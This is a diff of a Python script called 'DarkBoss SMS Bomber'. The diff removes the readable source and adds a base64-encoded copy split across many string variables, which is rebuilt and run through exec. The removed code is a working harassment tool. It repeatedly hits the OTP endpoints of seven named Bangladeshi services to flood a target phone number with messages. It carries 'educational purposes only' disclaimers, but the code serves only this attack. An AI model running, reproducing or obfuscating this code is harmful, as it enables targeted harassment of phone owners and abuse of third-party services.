+c239 = "ICAgICAgICgiRnVuZGVzaCIsIHNlbGYuc2VuZF9mdW5kZXNoKSwKICAgICAg"
+c240 = "ICAgICAgICAgICgiUmFiYml0SG9sZSIsIHNlbGYuc2VuZF9yYWJiaXRob2xl"
+c241 = "KSwKICAgICAgICAgICAgXQogICAgICAgICAgICAKICAgICAgICAgICAgcHJp"
+c242 = "bnQoIlxuXDAzM1sxOzM1bSIgKyAiPSIqNTApCiAgICAgICAgICAgIHByaW50"
+c243 = "KCIgICAgICAgICAgU1RBUlRJTkcgU01TIEJPTUJJTkcgQVRUQUNLIikKICAg"
+c244 = "ICAgICAgICAgcHJpbnQoIj0iKjUwICsgIlwwMzNbMG1cbiIpCiAgICAgICAg"
+c245 = "ICAgIAogICAgICAgICAgICBjeWNsZV9jb3VudCA9IDAKICAgICAgICAgICAg"
+c246 = "CiAgICAgICAgICAgICMgU3RhcnQgYm9tYmluZwogICAgICAgICAgICB3aGls"
+c247 = "ZSBzZWxmLnNlbnRfY291bnQgPCB0YXJnZXRfYW1vdW50OgogICAgICAgICAg"
+c248 = "ICAgICAgY3ljbGVfY291bnQgKz0gMQogICAgICAgICAgICAgICAgcHJpbnQo"
+c249 = "ZiJcblwwMzNbMTszNG1bK10gQ3ljbGUge2N5Y2xlX2NvdW50fSAtIFNlbmRp"
+c250 = "bmcgU01TIGJhdGNoXDAzM1swbSIpCiAgICAgICAgICAgICAgICAKICAgICAg"
+c251 = "ICAgICAgICAgICMgU2VuZCBmcm9tIGVhY2ggc2VydmljZQogICAgICAgICAg"
+c252 = "ICAgICAgZm9yIHNlcnZpY2VfbmFtZSwgc2VydmljZV9mdW5jIGluIHNlcnZp"
+c253 = "Y2VzOgogICAgICAgICAgICAgICAgICAgIGlmIHNlbGYuc2VudF9jb3VudCA+"
+c254 = "PSB0YXJnZXRfYW1vdW50OgogICAgICAgICAgICAgICAgICAgICAgICBicmVh"
+c255 = "awogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIHNl"
+c256 = "cnZpY2VfZnVuYyh0YXJnZXRfbnVtYmVyKQogICAgICAgICAgICAgICAgICAg"
+c257 = "IHRpbWUuc2xlZXAoMSkgICMgRGVsYXkgYmV0d2VlbiByZXF1ZXN0cwogICAg"
+c258 = "ICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAjIFNob3cgcHJvZ3Jlc3MK"
+c259 = "ICAgICAgICAgICAgICAgIHByaW50KGYiXG5cMDMzWzE7MzZtWytdIFByb2dy"
+c260 = "ZXNzOiB7c2VsZi5zZW50X2NvdW50fS97dGFyZ2V0X2Ftb3VudH0gU01TIHNl"
+c261 = "bnQiKQogICAgICAgICAgICAgICAgcHJpbnQoZiJbK10gRmFpbGVkIGF0dGVt"
+c262 = "cHRzOiB7c2VsZi5mYWlsZWRfY291bnR9IikKICAgICAgICAgICAgICAgIHBy"
+c263 = "aW50KGYiWytdIFdhaXRpbmcgNSBzZWNvbmRzIGJlZm9yZSBuZXh0IGN5Y2xl"
+c264 = "Li4uXDAzM1swbVxuIikKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAg"
+c265 = "ICAgaWYgc2VsZi5zZW50X2NvdW50IDwgdGFyZ2V0X2Ftb3VudDoKICAgICAg"
+c266 = "ICAgICAgICAgICAgICB0aW1lLnNsZWVwKDUpCiAgICAgICAgICAgIAogICAg"
+c267 = "ICAgICAgICAjIFNob3cgZmluYWwgcmVzdWx0cwogICAgICAgICAgICBzZWxm"
+c268 = "LnNob3dfZmluYWxfcmVwb3J0KCkKICAgICAgICAgICAgCiAgICAgICAgZXhj"
+c269 = "ZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgICAgIHByaW50KCJcMDMzWzE7MzFt"
+c270 = "RXJyb3I6IFBsZWFzZSBlbnRlciBhIHZhbGlkIG51bWJlciBmb3IgYW1vdW50"
+c271 = "XDAzM1swbSIpCiAgICAgICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0Ogog"
+c272 = "ICAgICAgICAgICBwcmludCgiXG5cblwwMzNbMTszM21bIV0gUHJvY2VzcyBp"
+c273 = "bnRlcnJ1cHRlZCBieSB1c2VyXDAzM1swbSIpCiAgICAgICAgICAgIHNlbGYu"
+c274 = "c2hvd19maW5hbF9yZXBvcnQoKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24g"
+c275 = "YXMgZToKICAgICAgICAgICAgcHJpbnQoZiJcMDMzWzE7MzFtVW5leHBlY3Rl"
+c276 = "ZCBlcnJvcjoge3N0cihlKX1cMDMzWzBtIikKICAgIAogICAgZGVmIHNob3df"
+c277 = "ZmluYWxfcmVwb3J0KHNlbGYpOgogICAgICAgICIiIlNob3cgZmluYWwgcmVw"
+c278 = "b3J0IiIiCiAgICAgICAgZW5kX3RpbWUgPSBkYXRldGltZS5ub3coKQogICAg"
+c279 = "ICAgIGR1cmF0aW9uID0gZW5kX3RpbWUgLSBzZWxmLnN0YXJ0X3RpbWUgaWYg"
+c280 = "c2VsZi5zdGFydF90aW1lIGVsc2UgIk4vQSIKICAgICAgICAKICAgICAgICBw"
+c281 = "cmludCgiXG4iICsgIj0iKjYwKQogICAgICAgIHByaW50KCJcMDMzWzE7MzJt"
+c282 = "IiArICIgIiAqIDE1ICsgIkFUVEFDSyBDT01QTEVURUQgU1VDQ0VTU0ZVTExZ"
+c283 = "IikKICAgICAgICBwcmludCgiXDAzM1sxOzM2bSIgKyAiPSIqNjApCiAgICAg"
+c284 = "ICAgcHJpbnQoZiJcMDMzWzE7MzNtWytdIFRvdGFsIFNNUyBTZW50ICAgICA6"
+c285 = "IHtzZWxmLnNlbnRfY291bnR9IikKICAgICAgICBwcmludChmIlsrXSBGYWls"
+c286 = "ZWQgQXR0ZW1wdHMgICA6IHtzZWxmLmZhaWxlZF9jb3VudH0iKQogICAgICAg"
+c287 = "IHByaW50KGYiWytdIFN1Y2Nlc3MgUmF0ZSAgICAgIDoge3NlbGYuc2VudF9j"
+c288 = "b3VudC8oc2VsZi5zZW50X2NvdW50K3NlbGYuZmFpbGVkX2NvdW50KSoxMDA6"
+c289 = "LjFmfSUiKQogICAgICAgIHByaW50KGYiWytdIER1cmF0aW9uICAgICAgICAg"
+c290 = "IDoge2R1cmF0aW9ufSIpCiAgICAgICAgcHJpbnQoZiJbK10gQnJhbmRpbmcg"
+c291 = "ICAgICAgICAgOiBDSE9XREhVUlktVkFJIENZQkVSIFRFQU0iKQogICAgICAg"
+c292 = "IHByaW50KCJcMDMzWzE7MzFtWyFdIERpc2NsYWltZXI6IFRoaXMgdG9vbCBp"
+c293 = "cyBmb3IgZWR1Y2F0aW9uYWwgcHVycG9zZXMgb25seS4iKQogICAgICAgIHBy"
+c294 = "aW50KCIgICAgTWlzdXNlIG9mIHRoaXMgdG9vbCBpcyBpbGxlZ2FsIGFuZCB1"
+c295 = "bmV0aGljYWwuXDAzM1swbSIpCiAgICAgICAgcHJpbnQoIj0iKjYwICsgIlxu"
+c296 = "IikKCmRlZiBtYWluKCk6CiAgICAiIiJNYWluIGZ1bmN0aW9uIiIiCiAgICAj"
+c297 = "IENoZWNrIGludGVybmV0IGNvbm5lY3Rpb24KICAgIHRyeToKICAgICAgICBy"
+c298 = "ZXF1ZXN0cy5nZXQoImh0dHBzOi8vd3d3Lmdvb2dsZS5jb20iLCB0aW1lb3V0"
+c299 = "PTUpCiAgICBleGNlcHQgcmVxdWVzdHMuQ29ubmVjdGlvbkVycm9yOgogICAg"
+c300 = "ICAgIHByaW50KCJcMDMzWzE7MzFtRXJyb3I6IE5vIGludGVybmV0IGNvbm5l"
+c301 = "Y3Rpb24uIFBsZWFzZSBjaGVjayB5b3VyIGNvbm5lY3Rpb24uXDAzM1swbSIp"
+c302 = "CiAgICAgICAgcmV0dXJuCiAgICAKICAgICMgQ3JlYXRlIGFuZCBydW4gYm9t"
+c303 = "YmVyCiAgICBib21iZXIgPSBTTVNCb21iZXIoKQogICAgYm9tYmVyLnJ1bigp"
+c304 = "CiAgICAKICAgICMgRXhpdCBtZXNzYWdlCiAgICBpbnB1dCgiXG5QcmVzcyBF"
+c305 = "bnRlciB0byBleGl0Li4uIikKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6"
+c306 = "CiAgICBtYWluKCk="
 
-os.system("clear" if os.name == "posix" else "cls")
-
-def style(text):
-    """Print text with typing effect"""
-    for char in text:
-        sys.stdout.write(char)
-        sys.stdout.flush()
-        time.sleep(0.03)
-
-style("\t\t  Loading.........")
-print("\n\n\n")
-time.sleep(1.3)
-os.system("clear" if os.name == "posix" else "cls")
-
-style("\t\t  Loading successful!")
-time.sleep(0.5)
-os.system("clear" if os.name == "posix" else "cls")
-
-print("\n\n")
-style(f" \033[1;31m Hey \033[1;33m{name}\033[1;31m, Use for ethical purposes only. Coded By CHOWDHURY-VAI CYBER TEAM")
-
-time.sleep(2)
-os.system("clear" if os.name == "posix" else "cls")
-
-print(""" \033[1;32m
-
-
-
-
-
-██████   █████  ██████  ██   ██ ██████   ██████  ███████ ███████  ██ 
-██   ██ ██   ██ ██   ██ ██  ██  ██   ██ ██    ██ ██      ██      ███ 
-██   ██ ███████ ██████  █████   ██████  ██    ██ ███████ ███████  ██ 
-██   ██ ██   ██ ██   ██ ██  ██  ██   ██ ██    ██      ██      ██  ██ 
-██████  ██   ██ ██   ██ ██   ██ ██████   ██████  ███████ ███████  ██                                                                                                                                              
-    
-\033[1;36m =========================================
-
- Creator    : CHOWDHURY-VAI CYBER TEAM
- Tool Name  : DarkBoss SMS Bomber
- Version    : 2.0 Fixed
- Disclaimer : For Educational Purposes Only
-             
-=========================================
-          
-\033[1;0m  
-""")
-
-class SMSBomber:
-    def __init__(self):
-        self.sent_count = 0
-        self.failed_count = 0
-        self.start_time = None
-        
-    def show_status(self, service_name, status, response_code=None):
-        """Show sending status"""
-        timestamp = datetime.now().strftime("%H:%M:%S")
-        if status == "success":
-            print(f"\033[1;32m[{timestamp}] ✓ {service_name}: Sent successfully (Code: {response_code})")
-        elif status == "failed":
-            print(f"\033[1;31m[{timestamp}] ✗ {service_name}: Failed (Code: {response_code})")
-        else:
-            print(f"\033[1;33m[{timestamp}] ⚠ {service_name}: {status}")
-    
-    def send_rokomari(self, number):
-        """Send SMS via Rokomari"""
-        try:
-            data = {
-                'emailOrPhone': number,
-                'countryCode': 'BD',
-            }
-            
-            headers = {
-                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36',
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Referer': 'https://www.rokomari.com',
-                'Origin': 'https://www.rokomari.com',
-            }
-            
-            response = requests.post('https://www.rokomari.com/otp/send', 
-                                   data=data, 
-                                   headers=headers,
-                                   timeout=10)
-            
-            if response.status_code == 200:
-                self.sent_count += 1
-                self.show_status("Rokomari", "success", response.status_code)
-                return True
-            else:
-                self.failed_count += 1
-                self.show_status("Rokomari", "failed", response.status_code)
-                return False
-                
-        except Exception as e:
-            self.failed_count += 1
-            self.show_status("Rokomari", f"Error: {str(e)[:30]}")
-            return False
-    
-    def send_redx(self, number):
-        """Send SMS via Redx"""
-        try:
-            json_data = {
-                'phoneNumber': number,
-            }
-            
-            headers = {
-                'User-Agent': 'Mozilla/5.0',
-                'Content-Type': 'application/json',
-            }
-            
-            response = requests.post(
-                'https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp',
-                json=json_data,
-                headers=headers,
-                timeout=10
-            )
-            
-            if response.status_code in [200, 201]:
-                self.sent_count += 1
-                self.show_status("Redx", "success", response.status_code)
-                return True
-            else:
-                self.failed_count += 1
-                self.show_status("Redx", "failed", response.status_code)
-                return False
-                
-        except Exception as e:
-            self.failed_count += 1
-            self.show_status("Redx", f"Error: {str(e)[:30]}")
-            return False
-    
-    def send_bikroy(self, number):
-        """Send SMS via Bikroy"""
-        try:
-            params = {
-                'phone': number,
-            }
-            
-            response = requests.get(
-                'https://bikroy.com/data/phone_number_login/verifications/phone_login',
-                params=params,
-                timeout=10
-            )
-            
-            if response.status_code == 200:
-                self.sent_count += 1
-                self.show_status("Bikroy", "success", response.status_code)
-                return True
-            else:
-                self.failed_count += 1
-                self.show_status("Bikroy", "failed", response.status_code)
-                return False
-                
-        except Exception as e:
-            self.failed_count += 1
-            self.show_status("Bikroy", f"Error: {str(e)[:30]}")
-            return False
-    
-    def send_iqra(self, number):
-        """Send SMS via Iqra Live"""
-        try:
-            response = requests.get(
-                f'https://apibeta.iqra-live.com/api/v2/sent-otp/{number}',
-                timeout=10
-            )
-            
-            if response.status_code == 200:
-                self.sent_count += 1
-                self.show_status("Iqra Live", "success", response.status_code)
-                return True
-            else:
-                self.failed_count += 1
-                self.show_status("Iqra Live", "failed", response.status_code)
-                return False
-                
-        except Exception as e:
-            self.failed_count += 1
-            self.show_status("Iqra Live", f"Error: {str(e)[:30]}")
-            return False
-    
-    def send_hoichoi(self, number):
-        """Send SMS via Hoichoi"""
-        try:
-            json_data = {
-                'phoneNumber': f'+88{number}',
-            }
-            
-            response = requests.post(
-                'https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code',
-                json=json_data,
-                timeout=10
-            )
-            
-            if response.status_code in [200, 201]:
-                self.sent_count += 1
-                self.show_status("Hoichoi", "success", response.status_code)
-                return True
-            else:
-                self.failed_count += 1
-                self.show_status("Hoichoi", "failed", response.status_code)
-                return False
-                
-        except Exception as e:
-            self.failed_count += 1
-            self.show_status("Hoichoi", f"Error: {str(e)[:30]}")
-            return False
-    
-    def send_fundesh(self, number):
-        """Send SMS via Fundesh"""
-        try:
-            json_data = {
-                'msisdn': number,
-            }
-            
-            response = requests.post(
-                'https://fundesh.com.bd/api/auth/generateOTP',
-                json=json_data,
-                timeout=10
-            )
-            
-            if response.status_code in [200, 201]:
-                self.sent_count += 1
-                self.show_status("Fundesh", "success", response.status_code)
-                return True
-            else:
-                self.failed_count += 1
-                self.show_status("Fundesh", "failed", response.status_code)
-                return False
-                
-        except Exception as e:
-            self.failed_count += 1
-            self.show_status("Fundesh", f"Error: {str(e)[:30]}")
-            return False
-    
-    def send_rabbithole(self, number):
-        """Send SMS via RabbitHole"""
-        try:
-            json_data = {
-                'mobile': f'+88{number}',
-            }
-            
-            response = requests.post(
-                'https://apix.rabbitholebd.com/appv2/login/requestOTP',
-                json=json_data,
-                timeout=10
-            )
-            
-            if response.status_code in [200, 201]:
-                self.sent_count += 1
-                self.show_status("RabbitHole", "success", response.status_code)
-                return True
-            else:
-                self.failed_count += 1
-                self.show_status("RabbitHole", "failed", response.status_code)
-                return False
-                
-        except Exception as e:
-            self.failed_count += 1
-            self.show_status("RabbitHole", f"Error: {str(e)[:30]}")
-            return False
-    
-    def run(self):
-        """Main function to run the SMS bomber"""
-        print("\n\033[1;36m" + "="*50)
-        print("          SMS BOMBER - CHOWDHURY-VAI CYBER TEAM")
-        print("="*50 + "\033[0m\n")
-        
-        try:
-            # Get user inputs
-            target_amount = int(input("Enter total SMS amount to send: "))
-            target_number = input("Enter target number (without +88): ").strip()
-            
-            # Validate number
-            if not target_number.isdigit() or len(target_number) != 11:
-                print("\033[1;31mError: Please enter a valid 11-digit Bangladeshi number\033[0m")
-                return
-            
-            print(f"\n\033[1;33mTarget: {target_number}")
-            print(f"Amount: {target_amount} SMS")
-            print("Starting in 3 seconds...\033[0m\n")
-            time.sleep(3)
-            
-            self.start_time = datetime.now()
-            
-            # List of services
-            services = [
-                ("Rokomari", self.send_rokomari),
-                ("Redx", self.send_redx),
-                ("Bikroy", self.send_bikroy),
-                ("Iqra Live", self.send_iqra),
-                ("Hoichoi", self.send_hoichoi),
-                ("Fundesh", self.send_fundesh),
-                ("RabbitHole", self.send_rabbithole),
-            ]
-            
-            print("\n\033[1;35m" + "="*50)
-            print("          STARTING SMS BOMBING ATTACK")
-            print("="*50 + "\033[0m\n")
-            
-            cycle_count = 0
-            
-            # Start bombing
-            while self.sent_count < target_amount:
-                cycle_count += 1
-                print(f"\n\033[1;34m[+] Cycle {cycle_count} - Sending SMS batch\033[0m")
-                
-                # Send from each service
-                for service_name, service_func in services:
-                    if self.sent_count >= target_amount:
-                        break
-                    
-                    service_func(target_number)
-                    time.sleep(1)  # Delay between requests
-                
-                # Show progress
-                print(f"\n\033[1;36m[+] Progress: {self.sent_count}/{target_amount} SMS sent")
-                print(f"[+] Failed attempts: {self.failed_count}")
-                print(f"[+] Waiting 5 seconds before next cycle...\033[0m\n")
-                
-                if self.sent_count < target_amount:
-                    time.sleep(5)
-            
-            # Show final results
-            self.show_final_report()
-            
-        except ValueError:
-            print("\033[1;31mError: Please enter a valid number for amount\033[0m")
-        except KeyboardInterrupt:
-            print("\n\n\033[1;33m[!] Process interrupted by user\033[0m")
-            self.show_final_report()
-        except Exception as e:
-            print(f"\033[1;31mUnexpected error: {str(e)}\033[0m")
-    
-    def show_final_report(self):
-        """Show final report"""
-        end_time = datetime.now()
-        duration = end_time - self.start_time if self.start_time else "N/A"
-        
-        print("\n" + "="*60)
-        print("\033[1;32m" + " " * 15 + "ATTACK COMPLETED SUCCESSFULLY")
-        print("\033[1;36m" + "="*60)
-        print(f"\033[1;33m[+] Total SMS Sent     : {self.sent_count}")
-        print(f"[+] Failed Attempts   : {self.failed_count}")
-        print(f"[+] Success Rate      : {self.sent_count/(self.sent_count+self.failed_count)*100:.1f}%")
-        print(f"[+] Duration          : {duration}")
-        print(f"[+] Branding          : CHOWDHURY-VAI CYBER TEAM")
-        print("\033[1;31m[!] Disclaimer: This tool is for educational purposes only.")
-        print("    Misuse of this tool is illegal and unethical.\033[0m")
-        print("="*60 + "\n")
-
-def main():
-    """Main function"""
-    # Check internet connection
-    try:
-        requests.get("https://www.google.com", timeout=5)
-    except requests.ConnectionError:
-        print("\033[1;31mError: No internet connection. Please check your connection.\033[0m")
-        return
-    
-    # Create and run bomber
-    bomber = SMSBomber()
-    bomber.run()
-    
-    # Exit message
-    input("\nPress Enter to exit...")
-
-if __name__ == "__main__":
-    main()
+# Reconstruct and execute
+encrypted_code = "".join([c0, c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11, c12, c13, c14, c15, c16, c17, c18, c19, c20, c21, c22, c23, c24, c25, c26, c27, c28, c29, c30, c31, c32, c33, c34, c35, c36, c37, c38, c39, c40, c41, c42, c43, c44, c45, c46, c47, c48, c49, c50, c51, c52, c53, c54, c55, c56, c57, c58, c59, c60, c61, c62, c63, c64, c65, c66, c67, c68, c69, c70, c71, c72, c73, c74, c75, c76, c77, c78, c79, c80, c81, c82, c83, c84, c85, c86, c87, c88, c89, c90, c91, c92, c93, c94, c95, c96, c97, c98, c99, c100, c101, c102, c103, c104, c105, c106, c107, c108, c109, c110, c111, c112, c113, c114, c115, c116, c117, c118, c119, c120, c121, c122, c123, c124, c125, c126, c127, c128, c129, c130, c131, c132, c133, c134, c135, c136, c137, c138, c139, c140, c141, c142, c143, c144, c145, c146, c147, c148, c149, c150, c151, c152, c153, c154, c155, c156, c157, c158, c159, c160, c161, c162, c163, c164, c165, c166, c167, c168, c169, c170, c171, c172, c173, c174, c175, c176, c177, c178, c179, c180, c181, c182, c183, c184, c185, c186, c187, c188, c189, c190, c191, c192, c193, c194, c195, c196, c197, c198, c199, c200, c201, c202, c203, c204, c205, c206, c207, c208, c209, c210, c211, c212, c213, c214, c215, c216, c217, c218, c219, c220, c221, c222, c223, c224, c225, c226, c227, c228, c229, c230, c231, c232, c233, c234, c235, c236, c237, c238, c239, c240, c241, c242, c243, c244, c245, c246, c247, c248, c249, c250, c251, c252, c253, c254, c255, c256, c257, c258, c259, c260, c261, c262, c263, c264, c265, c266, c267, c268, c269, c270, c271, c272, c273, c274, c275, c276, c277, c278, c279, c280, c281, c282, c283, c284, c285, c286, c287, c288, c289, c290, c291, c292, c293, c294, c295, c296, c297, c298, c299, c300, c301, c302, c303, c304, c305, c306])
+exec(__import__('base64').b64decode(encrypted_code).decode())
